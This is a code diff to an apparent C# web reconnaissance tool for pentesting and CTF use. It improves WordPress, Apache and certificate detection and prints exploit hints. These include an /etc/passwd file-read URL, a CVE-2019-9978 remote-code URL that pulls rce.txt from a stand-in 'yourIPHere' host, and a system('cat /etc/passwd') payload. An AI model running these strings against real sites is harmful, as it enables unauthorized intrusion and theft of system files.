@@ -17,7 +17,7 @@ namespace Reecon
 {
     class Web
     {
-        static string url = "";
+        static string scanURL = "";
         public static void GetInfo(string[] args)
         {
             if (args.Length != 2)
@@ -25,18 +25,18 @@ namespace Reecon
                 Console.WriteLine("Web Usage: reecon -web http://site.com/");
                 return;
             }
-            url = args[1];
-            if (!url.StartsWith("http"))
+            scanURL = args[1];
+            if (!scanURL.StartsWith("http"))
             {
                 Console.WriteLine("Invalid URL - Must start with http");
                 return;
             }
-            ScanPage(url);
+            ScanPage(scanURL);
             Console.WriteLine("Searching for common files...");
 
             // Used elsewhere so it can't just have its own output
 
-            string commonFiles = FindCommonFiles(url);
+            string commonFiles = FindCommonFiles(scanURL);
             if (commonFiles.Trim() != "")
             {
                 Console.WriteLine(commonFiles);
@@ -176,9 +176,9 @@ namespace Reecon
 
                 if (href.StartsWith("/"))
                 {
-                    if (url.EndsWith("/"))
+                    if (scanURL.EndsWith("/"))
                     {
-                        href = url + href.TrimStart('/');
+                        href = scanURL + href.TrimStart('/');
                     }
                 }
                 if (href.Length > 1 && !href.StartsWith("#")) // Section - Not actual URL
@@ -327,6 +327,7 @@ namespace Reecon
                 "wp-config.php.bak",
                 // phpmyadmin
                 "phpmyadmin/",
+                "phpMyAdmin", // Some are case sensitive
                 // Kibana
                 "app/kibana",
                 // Bolt CMS
@@ -565,7 +566,7 @@ namespace Reecon
                                     // /v2/cmnatic/myapp1/tags/list
                                     // --> /cmnatic/myapp1/manifests/notsecure
                                 }
-                                returnText += $"------> {url}v2/repo/app/manifests/tagnamehere";
+                                returnText += $"------> {url}v2/[repoName]/app/manifests/[tagName]";
                                 // Every notfound will be the same
                                 break;
                             }
@@ -666,7 +667,7 @@ namespace Reecon
 
         public static string FormatHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
         {
-            string urlPrefix = url.StartsWith("https") ? "https" : "http";
+            string urlPrefix = URL.StartsWith("https") ? "https" : "http";
             string responseText = "";
             if (StatusCode != HttpStatusCode.OK)
             {
@@ -718,9 +719,9 @@ namespace Reecon
                 if (PageTitle.StartsWith("Apache Tomcat"))
                 {
                     // Sanitize URL
-                    if (!url.EndsWith("/"))
+                    if (!URL.EndsWith("/"))
                     {
-                        url += "/";
+                        URL += "/";
                     }
 
                     // CVE's
@@ -849,7 +850,6 @@ namespace Reecon
                     }
                 }
             }
-
             // Page Text
             if (PageText.Length > 0)
             {
@@ -874,7 +874,9 @@ namespace Reecon
                 }
 
                 // Wordpress
-                if (PageText.Contains("/wp-content/themes/") && PageText.Contains("/wp-includes/"))
+                //if (PageText.Contains("/wp-content/themes/") && (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\")))
+                // Some Wordpress pages don't contain "wp-content" (Ref: HTB Acute)
+                if (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\"))
                 {
                     responseText += "- " + "Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
                     // Basic User Enumeration - Need to combine these two...
@@ -897,7 +899,7 @@ namespace Reecon
                     var wpUserTestTwo = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/index.php/wp-json/wp/v2/users");
                     if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
                     {
-                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
+                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
                         foreach (JsonElement element in document.RootElement.EnumerateArray())
                         {
                             string wpUserName = element.GetProperty("name").GetString();
@@ -913,12 +915,24 @@ namespace Reecon
                     // Basic vulnerable addons
                     if (PageText.Contains("/wp-with-spritz/"))
                     {
-                        responseText += "-- Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
+                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlPrefix}://{DNS}/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                     }
                     else if (PageText.Contains("/wp-content/plugins/social-warfare"))
                     {
-                        responseText += "-- Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - http://192.168.56.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
                         responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
+                    }
+
+                    // Check for public folders
+                    var contentDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/");
+                    if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
+                    {
+                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                    }
+                    var pluginsDir = Web.GetHTTPInfo($"{urlPrefix}://{DNS}/wp-content/plugins/");
+                    if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
+                    {
+                        responseText += "-- " + $"{urlPrefix}://{DNS}/wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
                     }
 
                     responseText += $"-- User Enumeration: wpscan --url {urlPrefix}://{DNS}/ --enumerate u1-5" + Environment.NewLine;
@@ -987,13 +1001,11 @@ namespace Reecon
                     responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                 }
             }
-
             // DNS
             if (!string.IsNullOrEmpty(DNS))
             {
                 responseText += "- DNS: " + DNS + Environment.NewLine;
             }
-
             // Headers!
             if (Headers.Any())
             {
@@ -1006,7 +1018,16 @@ namespace Reecon
                     // Eg: Apache/2.4.46, (Win64), OpenSSL/1.1.1j, PHP/7.3.27
                     // Heartbleed - OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
                     responseText += "- Server: " + serverText + Environment.NewLine;
-                    if (serverText.StartsWith("MiniServ/"))
+                    if (serverText.StartsWith("Apache"))
+                    {
+                        responseText += "-- " + "Apache Detected".Pastel(Color.Orange) + Environment.NewLine;
+                        if (serverText.Contains("2.4.49") || serverText.Contains("2.4.50"))
+                        {
+                            responseText += "--- " + "Version possible vulnerable to CVE-2021-41773 or CVE-2021-42013" + Environment.NewLine;
+                            // TODO: Add better sources
+                        }
+                    }
+                    else if (serverText.StartsWith("MiniServ/"))
                     {
                         responseText += "-- " + "Webmin Server Detected".Pastel(Color.Orange) + Environment.NewLine;
                         if (serverText == "MiniServ/1.580")
@@ -1216,13 +1237,13 @@ namespace Reecon
                     X509ExtensionCollection extensionCollection = theCert.Extensions;
                     foreach (X509Extension extension in extensionCollection)
                     {
-                        string friendlyName = extension.Oid.FriendlyName;
-                        // Console.WriteLine("Extension Name: " + extensionType);
-                        // Windows: Subject Alternative Name
-                        // Linux: X509v3 Subject Alternative Name
-                        if (friendlyName.Contains("Subject Alternative Name"))
+                        // Oid.FriendlyName (Note: Can be null)
+                        // - Windows: Subject Alternative Name
+                        // - Linux: X509v3 Subject Alternative Name
+                        // - Note: Only in English - Not cross-language friendly :(
+                        // Subject Alternative Name == Oid 2.5.29.17
+                        if (extension.Oid.Value == "2.5.29.17")
                         {
-
                             AsnEncodedData asndata = new(extension.Oid, extension.RawData);
                             List<string> formattedValues = asndata.Format(true).Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                             string itemList = "";
